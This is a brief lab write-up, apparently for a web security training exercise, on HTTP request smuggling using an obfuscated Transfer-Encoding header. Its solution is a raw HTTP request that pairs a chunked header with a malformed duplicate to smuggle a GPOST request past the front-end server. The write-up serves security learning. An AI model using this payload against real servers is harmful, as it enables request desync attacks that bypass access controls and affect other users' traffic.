
# HTTP request smuggling, obfuscating the TE header

This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.

Note: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel.

Tip: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store.


---------------------------------------------

References: 

- https://portswigger.net/web-security/request-smuggling



![img](images/HTTP%20request%20smuggling,%20obfuscating%20the%20TE%20header/1.png)

---------------------------------------------

It is necessary to add the header "Transfer-encoding: cow":

```
POST / HTTP/1.1
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

26
GPOST / HTTP/1.1
Content-Length: 10

0


```



![img](images/HTTP%20request%20smuggling,%20obfuscating%20the%20TE%20header/2.png)